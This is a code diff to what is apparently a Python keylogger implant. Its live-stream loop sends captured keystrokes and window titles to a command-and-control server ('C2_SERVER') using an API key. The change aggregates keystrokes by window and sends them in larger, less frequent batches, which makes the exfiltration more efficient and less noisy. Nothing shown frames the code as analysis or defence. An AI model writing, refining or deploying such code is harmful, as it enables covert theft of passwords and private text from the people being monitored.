@@ -414,39 +414,47 @@ def start_permanent_keylogger():
 
 
 async def live_stream_flusher_loop(node_id_provider):
-    """Periodically sends queued live telemetry/keystroke events to C2 backend."""
+    """Periodically aggregates and sends queued live telemetry/keystroke events to C2 backend."""
     while True:
         try:
-            await asyncio.sleep(1.5)
+            await asyncio.sleep(5.0)
             node_id = node_id_provider()
             if not node_id:
                 continue
 
-            batch = []
-            while not LIVE_STREAM_QUEUE.empty() and len(batch) < 50:
+            raw_batch = []
+            while not LIVE_STREAM_QUEUE.empty() and len(raw_batch) < 200:
                 try:
                     item = LIVE_STREAM_QUEUE.get_nowait()
-                    batch.append(item)
+                    raw_batch.append(item)
                 except queue.Empty:
                     break
 
-            if not batch:
+            if not raw_batch:
                 continue
 
-            for item in batch:
-                stream_type = item.get("stream_type", "keylog")
-                window_title = item.get("window_title", "")
-                content = item.get("content", "")
+            # Aggregate consecutive items with the same stream_type and window_title
+            aggregated = []
+            for item in raw_batch:
+                stype = item.get("stream_type", "keylog")
+                wtitle = item.get("window_title", "")
+                text = item.get("content", "")
 
-                await http_post(
-                    f"{C2_SERVER}/live-stream/{node_id}",
-                    {"X-API-KEY": API_KEY, "Content-Type": "application/json"},
-                    {
-                        "stream_type": stream_type,
-                        "window_title": window_title,
-                        "content": content,
-                    }
-                )
+                if aggregated and aggregated[-1]["stream_type"] == stype and aggregated[-1]["window_title"] == wtitle:
+                    aggregated[-1]["content"] += text
+                else:
+                    aggregated.append({
+                        "stream_type": stype,
+                        "window_title": wtitle,
+                        "content": text
+                    })
+
+            # Send as a single batch HTTP POST
+            await http_post(
+                f"{C2_SERVER}/live-stream/{node_id}",
+                {"X-API-KEY": API_KEY, "Content-Type": "application/json"},
+                aggregated
+            )
         except Exception as e:
             print(f"[LIVE_STREAM ERROR] {e}")
 
